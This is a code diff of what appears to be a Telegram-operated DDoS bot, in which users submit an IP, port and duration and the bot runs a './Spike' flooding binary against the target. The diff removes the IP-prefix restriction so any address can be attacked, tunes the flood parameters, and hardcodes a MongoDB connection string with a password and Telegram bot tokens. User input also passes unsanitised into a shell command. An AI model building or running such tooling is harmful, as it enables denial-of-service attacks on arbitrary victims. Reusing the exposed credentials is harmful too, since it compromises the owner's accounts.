@@ -14,21 +14,19 @@ from datetime import datetime, timedelta, timezone
 # Database Configuration
 MONGO_URI = 'mongodb+srv://harry:Sachdeva@cluster1.b02ct.mongodb.net/?retryWrites=true&w=majority&appName=Cluster1'
 client = MongoClient(MONGO_URI)
-db = client['Harvinder']
+db = client['Test']
 users_collection = db['jon']
 settings_collection = db['settings0']  # A new collection to store global settings
 redeem_codes_collection = db['redeem_codes0']
 
 # Bot Configuration
-TELEGRAM_BOT_TOKEN = '7708634167:AAETKWTTgV_V0eRQ_Y39bm5Iu4FQJR70ZH0'
+TELEGRAM_BOT_TOKEN = '7542906508:AAGjdyvoGiwNl2qhuz9fFVKFlqsVbNxEfv4'
 ADMIN_USER_ID = 5926215327  # Replace with your admin user ID
 
 # Cooldown dictionary and user attack history
 cooldown_dict = {}
 user_attack_history = {}
 
-# Valid IP prefixes
-valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')
 
 async def help_command(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
@@ -154,10 +152,6 @@ async def attack(update: Update, context: CallbackContext):
 
     ip, port, duration = args
 
-    # Check if the IP is valid
-    if not ip.startswith(valid_ip_prefixes):
-        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid IP address! Please use an IP with a valid prefix.*", parse_mode='Markdown')
-        return
 
     # Cooldown period in seconds
     cooldown_period = 60
@@ -204,7 +198,7 @@ async def attack(update: Update, context: CallbackContext):
 async def run_attack(chat_id, ip, port, duration, context):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./Spike {ip} {port} {duration} 1024 400",
+            f"./Spike {ip} {port} {duration} 9 1000",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
